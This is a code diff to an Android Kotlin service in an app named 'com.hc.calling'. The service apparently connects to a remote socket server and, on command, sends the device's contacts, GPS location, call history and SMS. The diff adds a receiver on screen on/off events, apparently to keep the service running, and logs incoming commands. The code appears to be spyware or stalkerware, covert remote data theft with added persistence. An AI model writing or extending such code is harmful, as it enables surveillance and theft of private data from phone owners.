@@ -2,6 +2,7 @@ package com.hc.calling
 
 import android.app.Service
 import android.content.Intent
+import android.content.IntentFilter
 import android.os.Binder
 import android.os.IBinder
 import com.hc.calling.commands.Executor
@@ -9,6 +10,7 @@ import com.hc.calling.commands.callingtransaction.Call
 import com.hc.calling.commands.contact.Contacts
 import com.hc.calling.commands.gps.GPS
 import com.hc.calling.commands.sms.Sms
+import com.hc.calling.keeper.KeepLiveReceiver
 import com.hc.calling.socket.SocketConductor
 
 /**
@@ -24,6 +26,7 @@ class MainService : Service() {
         executors[Contacts.SEND_CONTACTS_LIST] = Contacts(context = this)
         executors[GPS.SEND_GPS] = GPS(context = this)
         executors[Call.SEND_CALLING_HISTORY] = Call(context = this)
+
     }
 
     override fun onBind(intent: Intent?): IBinder {
@@ -34,6 +37,9 @@ class MainService : Service() {
      *    connect to the socket server
      */
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        val keepLiveReceiver = KeepLiveReceiver()
+        this.registerReceiver(keepLiveReceiver, IntentFilter(Intent.ACTION_SCREEN_ON))
+        this.registerReceiver(keepLiveReceiver, IntentFilter(Intent.ACTION_SCREEN_OFF))
         SocketConductor
             .instance
             .connect2Server(context = this)
@@ -41,6 +47,9 @@ class MainService : Service() {
         //add listeners to socket
         executors.forEach { map ->
             SocketConductor.instance.emmiter!!.on(map.key) {
+                it.forEach { item ->
+                    com.orhanobut.logger.Logger.i(item as String)
+                }
                 map.value.execute(it)
             }
         }
